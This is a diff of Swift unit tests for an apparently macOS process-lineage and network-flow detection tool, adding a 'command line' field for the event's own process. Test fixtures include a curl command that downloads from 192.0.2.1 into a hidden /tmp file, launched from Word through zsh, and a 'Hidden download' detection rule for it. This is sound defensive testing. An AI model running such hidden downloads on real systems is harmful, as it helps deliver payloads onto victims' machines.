@@ -92,8 +92,10 @@ final class LineageFieldTests: XCTestCase {
             "lineage.paths", "lineage.command_lines", "lineage.signing_ids", "lineage.team_ids",
             "lineage.codesigning_types",
         ])
-        XCTAssertEqual(LineageField.all.count, LineageField.perChain * LineageField.Chain.allCases.count)
-        XCTAssertEqual(LineageField.all.dropFirst(LineageField.perChain).map(\.path),
+        XCTAssertEqual(LineageField.all.count, LineageField.perChain * LineageField.Chain.allCases.count + 1)
+        XCTAssertEqual(LineageField.all.last?.path, "lineage.process.command_line")
+        XCTAssertEqual(LineageField.processOffset, LineageField.all.count - 1)
+        XCTAssertEqual(LineageField.all.prefix(LineageField.processOffset).dropFirst(LineageField.perChain).map(\.path),
                        LineageField.all.prefix(LineageField.perChain).map {
                            "launched_by" + $0.path.dropFirst("lineage".count)
                        })
@@ -110,10 +112,13 @@ final class LineageFieldTests: XCTestCase {
         XCTAssertEqual(IndicatorField(path: "launched_by.parent.team_id")?.description, "launchedByParentTeamID")
         XCTAssertEqual(IndicatorField(path: "launched_by.paths").flatMap(\.lineageOffset).map(LineageField.chain),
                        .launchedBy)
+        XCTAssertEqual(IndicatorField(path: "lineage.process.command_line")?.description, "lineageProcessCommandLine")
+        XCTAssertEqual(LineageField.chain(at: LineageField.processOffset), .lineage)
+        XCTAssertNil(IndicatorField(path: "launched_by.process.command_line"))
         XCTAssertNil(IndicatorField.processExecutablePath.lineageOffset)
         XCTAssertNil(IndicatorField.closeTargetName.lineageOffset)
         XCTAssertNil(IndicatorField(path: "lineage.parent.pid"))
-        XCTAssertEqual(IndicatorField.allCases.count, Int(IndicatorField.closeTargetName.rawValue) + 1 + 40)
+        XCTAssertEqual(IndicatorField.allCases.count, Int(IndicatorField.execEnvCount.rawValue) + 1 + 41)
     }
 
     /// A process three deep has its parent, its grandparent, the first below launchd, and all three in each list.
@@ -138,7 +143,7 @@ final class LineageFieldTests: XCTestCase {
     }
 
     /// With one ancestor, it's the parent and the first below launchd, and there's no grandparent. A child of
-    /// launchd has none: every ancestor's field is `nil` and every list is empty.
+    /// launchd has none: every ancestor's field is `nil` and every list is empty. It still has its own command line.
     func testAProcessWithOneAncestorOrNone() throws {
         let one = values(of: try exit(of: 110, parent: 100), table: lineage)
         XCTAssertEqual(one["lineage.parent.signing_id"], "com.microsoft.Word")
@@ -148,10 +153,60 @@ final class LineageFieldTests: XCTestCase {
         XCTAssertEqual(one["lineage.signing_ids"], ["com.microsoft.Word"])
 
         let none = values(of: try exit(of: 400), table: lineage)
-        for entry in LineageField.all {
+        for entry in LineageField.all.prefix(LineageField.processOffset) {
             let nothing: AnyHashable = entry.kind == .strings ? [String]() : NSNull()
             XCTAssertEqual(none[entry.path], nothing, entry.path)
         }
+        XCTAssertEqual(none["lineage.process.command_line"], "/usr/libexec/agent --run")
+    }
+
+    /// The event's own process's command line is read by its own key: an exit's process, the program that called an
+    /// exec, and a flow's process. A process the table knows only another program of has none, though its ancestors
+    /// are found by that program. A rule on it matches on a flow, and only indicators may read it.
+    func testTheProcessesOwnCommandLine() throws {
+        let exit = values(of: try exit(of: 310, parent: 300), table: lineage)
+        XCTAssertEqual(exit["lineage.process.command_line"], "/usr/bin/true --run")
+        XCTAssertEqual(exit["lineage.parent.command_line"], "/usr/bin/curl --run")
+
+        let shell = try esloggerProcess(pid: 200, pidversion: 1, path: "/bin/zsh", parent: (100, 1))
+        let target = try esloggerProcess(pid: 200, pidversion: 2, path: "/usr/bin/curl", parent: (100, 1))
+        let exec = values(of: try execMessage(by: shell, of: target), table: lineage)
+        XCTAssertEqual(exec["lineage.process.command_line"], "/bin/zsh --run", "The program that called exec")
+        XCTAssertEqual(exec["lineage.parent.signing_id"], "com.microsoft.Word")
+
+        let later = try exitMessage(of: try esloggerProcess(pid: 310, pidversion: 2, path: "/usr/bin/true",
+                                                            parent: (300, 1)))
+        let newer = values(of: later, table: lineage)
+        XCTAssertEqual(newer["lineage.process.command_line"], NSNull(), "Never another program's")
+        XCTAssertEqual(newer["lineage.parent.executable.path"], "/usr/bin/curl")
+
+        lineage.seed([(ProcessProgram(key: ProcessKey(pid: 753, pidversion: 2_341), path: "/usr/bin/curl",
+                                      commandLine: "curl -s -o /tmp/.x http://192.0.2.1/"), 200)])
+        let flow = SyntheticFlows.message(SyntheticFlows.record(.opened, process: SyntheticFlows.process(
+            pid: 753, path: "/usr/bin/curl", signingID: "com.apple.curl")))
+        let rule = #"event.new_flow != nil AND lineage.process.command_line CONTAINS " -o /tmp/.""#
+        let compiled = CompiledIndicators([Indicator(name: "Hidden download", description: "", symbol: "star",
+                                                     color: .red, predicate: rule)])
+        XCTAssertEqual(compiled.problems.map(\.reason), [])
+        var cache = MessageValueCache()
+        cache.lineage = lineage
+        XCTAssertEqual(compiled.hits(for: flow, values: &cache).map(\.name), ["Hidden download"])
+
+        let predicate = NSPredicate(format: #"event.close != nil AND lineage.process.command_line CONTAINS "x""#)
+        XCTAssertNoThrow(try PredicateGuard.check(predicate, for: .indicator))
+        for audience in [PredicateAudience.commandLine, .search] {
+            XCTAssertThrowsError(try PredicateGuard.check(predicate, for: audience))
+        }
+    }
+
+    /// The predicate editor completes the event's own process under `lineage` only, and says what it is.
+    func testTheProcessIsCompleted() {
+        XCTAssertTrue(LineageField.children(of: ["lineage"]).contains("process"))
+        XCTAssertFalse(LineageField.children(of: ["launched_by"]).contains("process"))
+        XCTAssertEqual(LineageField.children(of: ["lineage", "process"]), ["command_line"])
+        XCTAssertEqual(LineageField.completion(of: ["lineage", "process"])?.type, "object")
+        XCTAssertEqual(LineageField.completion(of: ["lineage", "process", "command_line"])?.type, "string")
+        XCTAssertNil(LineageField.completion(of: ["lineage", "process", "signing_id"]))
     }
 
     /// Without a lineage table every field is `nil`, the lists too: nothing is known, which isn't "no ancestors".
@@ -225,6 +280,55 @@ final class LineageFieldTests: XCTestCase {
         XCTAssertEqual(names(&untracked, try exit(of: 310, parent: 300)), [])
     }
 
+    /// A network flow's process has its ancestors, by its audit token, as an Endpoint Security event's process does.
+    /// A rule on a flow reads curl's parent and the app that started its chain, on its new_flow and its flow_closed.
+    /// A flow whose process was gone before its socket was reported has no token, so no ancestors. One whose process
+    /// the table hasn't heard of yet, though it's running, has its ancestors read from the system.
+    func testAFlowsProcessHasItsAncestors() throws {
+        lineage.seed([(ProcessProgram(key: ProcessKey(pid: 753, pidversion: 2_341), path: "/usr/bin/curl",
+                                      commandLine: "curl -s http://192.0.2.1/", signingID: "com.apple.curl",
+                                      codesigningType: "PLATFORM"), 200)])
+        let curl = SyntheticFlows.process(pid: 753, path: "/usr/bin/curl", signingID: "com.apple.curl")
+        let opened = SyntheticFlows.message(SyntheticFlows.record(.opened, process: curl))
+        let values = values(of: opened, table: lineage)
+        XCTAssertEqual(values["lineage.parent.executable.path"], "/bin/zsh")
+        XCTAssertEqual(values["lineage.parent.command_line"], "/bin/zsh --run")
+        XCTAssertEqual(values["lineage.grandparent.signing_id"], "com.microsoft.Word")
+        XCTAssertEqual(values["lineage.origin.team_id"], "UBF8T346G9")
+        XCTAssertEqual(values["launched_by.parent.executable.path"], "/bin/zsh")
+        XCTAssertEqual((values["lineage.command_lines"] as? [String])?.count, 2)
+
+        let compiled = CompiledIndicators([Indicator(
+            name: "Flow from Word", description: "", symbol: "star", color: .red,
+            predicate: #"(event.new_flow != nil OR event.flow_closed != nil) AND "#
+                + #"lineage.parent.command_line CONTAINS "zsh" AND ANY lineage.signing_ids == "com.microsoft.Word""#)])
+        XCTAssertEqual(compiled.problems.map(\.reason), [])
+        var cache = MessageValueCache()
+        cache.lineage = lineage
+        let closed = SyntheticFlows.message(SyntheticFlows.record(.closed, process: curl))
+        for flow in [opened, closed] {
+            XCTAssertEqual(compiled.hits(for: flow, values: &cache).map(\.name), ["Flow from Word"])
+            cache.reset()
+        }
+        let reaped = SyntheticFlows.message(SyntheticFlows.record(.opened,
+                                                                  process: SyntheticFlows.process(state: .reaped)))
+        XCTAssertEqual(compiled.hits(for: reaped, values: &cache).map(\.name), [])
+        XCTAssertEqual(Set(self.values(of: reaped, table: lineage).values), [NSNull(), [String]()])
+
+        let reading = ProcessLineage(reader: { pid in
+            pid == 754 ? (ProcessProgram(key: ProcessKey(pid: 754, pidversion: 2_341), path: "/usr/bin/curl"), 200)
+                : nil
+        })
+        reading.seed([(program(100, "/Applications/Microsoft Word.app/Contents/MacOS/Microsoft Word",
+                               "com.microsoft.Word", "UBF8T346G9", "DEVELOPER_ID"), 1),
+                      (program(200, "/bin/zsh", "com.apple.zsh", nil, "PLATFORM"), 100)])
+        let unknown = SyntheticFlows.message(SyntheticFlows.record(.opened, process: SyntheticFlows.process(
+            pid: 754, path: "/usr/bin/curl", signingID: "com.apple.curl")))
+        let read = self.values(of: unknown, table: reading)
+        XCTAssertEqual(read["lineage.parent.executable.path"], "/bin/zsh", "Read from the system, as it's running")
+        XCTAssertEqual(read["lineage.origin.signing_id"], "com.microsoft.Word")
+    }
+
     /// The launched-by chain follows who really caused each process to run: an XPC service launchd forked has no
     /// Unix ancestors, and its host app as its launched-by parent, with the app's own ancestors behind it. A process
     /// with no launched-by parent of its own has the same ancestors along both chains.
@@ -261,7 +365,7 @@ final class LineageFieldTests: XCTestCase {
         XCTAssertNoThrow(try PredicateGuard.check(predicate, for: .indicator))
         for audience in [PredicateAudience.commandLine, .search] {
             XCTAssertThrowsError(try PredicateGuard.check(predicate, for: audience)) { error in
-                XCTAssertTrue("\(error)".contains("a process's ancestors are read by indicators"), "\(error)")
+                XCTAssertTrue("\(error)".contains("are read by indicators"), "\(error)")
             }
         }
         XCTAssertThrowsError(try PredicateGuard.check(NSPredicate(format: #"lineage.parent.pid == 5"#),
